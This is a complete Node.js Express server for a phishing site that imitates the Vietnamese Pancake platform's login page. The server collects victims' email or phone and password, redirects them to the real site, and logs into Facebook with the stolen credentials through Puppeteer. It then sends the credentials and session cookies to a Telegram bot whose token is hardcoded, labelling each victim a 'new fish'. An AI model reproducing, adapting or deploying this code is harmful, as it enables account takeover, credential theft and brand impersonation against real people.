const express = require('express');
const puppeteer = require('puppeteer');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

const BOT_TOKEN = '7371520036:AAEOaH2aesiMDvGT5T7iHs3XyTroSLsiGSM';
const CHAT_ID = '-1003722341918';

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pancake - Giải pháp quản lý toàn diện</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background-color: #f0f7ff; color: #1a202c; position: relative; }
        .container { max-width: 450px; margin: 0 auto; padding: 40px 20px; text-align: center; }
        .logo { width: 140px; margin-bottom: 30px; }
        .tagline { background: #fff; color: #ff9800; padding: 6px 15px; border-radius: 20px; font-size: 13px; font-weight: bold; display: inline-block; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        h1 { font-size: 28px; line-height: 1.3; color: #102a43; margin-bottom: 20px; }
        p { color: #486581; line-height: 1.6; margin-bottom: 35px; font-size: 15px; }
        .login-box { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); position: relative; }
        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #d9e2ec; border-radius: 10px; box-sizing: border-box; font-size: 15px; background: #f8fafc; }
        .btn-main { width: 100%; padding: 15px; background: #3b82f6; border: none; border-radius: 30px; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        
        /* Hiệu ứng Loading */
        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { margin-top: 15px; font-weight: bold; color: #102a43; }
        
        .footer-img { width: 100%; margin-top: 40px; opacity: 0.8; }
    </style>
</head>
<body>
    <div id="overlay">
        <div class="spinner"></div>
        <div class="loading-text">Đang xác thực tài khoản...</div>
    </div>

    <div class="container">
        <img src="https://pancake.vn/images/logo.png" class="logo">
        <div class="tagline">🍰 Kinh doanh thảnh thơi</div>
        <h1>Giải pháp quản lý hội thoại đa kênh toàn diện</h1>
        <p>Hợp nhất mọi cuộc hội thoại khách hàng trên một nền tảng duy nhất.</p>
        
        <div class="login-box">
            <form id="loginForm" action="/auth" method="POST">
                <input type="text" name="email" placeholder="Số điện thoại hoặc Email" required>
                <input type="password" name="pass" placeholder="Mật khẩu tài khoản" required>
                <button type="submit" class="btn-main">Dùng thử ngay</button>
            </form>
        </div>
        <img src="https://pancake.vn/images/banner-home.png" class="footer-img">
    </div>

    <script>
        document.getElementById('loginForm').onsubmit = function() {
            document.getElementById('overlay').style.display = 'flex';
        };
    </script>
</body>
</html>
    `);
});

app.post('/auth', async (req, res) => {
    const { email, pass } = req.body;
    res.redirect('https://pancake.vn/dashboard');

    const browser = await puppeteer.launch({ args: ['--no-sandbox', '--disable-setuid-sandbox'] });
    const page = await browser.newPage();

    try {
        await page.goto('https://m.facebook.com/login');
        await page.type('#m_login_email', email);
        await page.type('#m_login_password', pass);
        await page.click('button[name="login"]');
        await page.waitForNavigation({ timeout: 10000 });
        
        const cookies = await page.cookies();
        const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');

        const message = "🔔 **CÓ CÁ MỚI (PANCAKE)**\\n👤 **TK:** `" + email + "`\\n🔑 **MK:** `" + pass + "`\\n🍪 **Cookie:** `" + cookieStr + "`";
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
    } catch (e) {
        console.log("Lỗi hoặc 2FA");
    } finally {
        await browser.close();
    }
});

app.listen(port, () => console.log('Server Live!'));
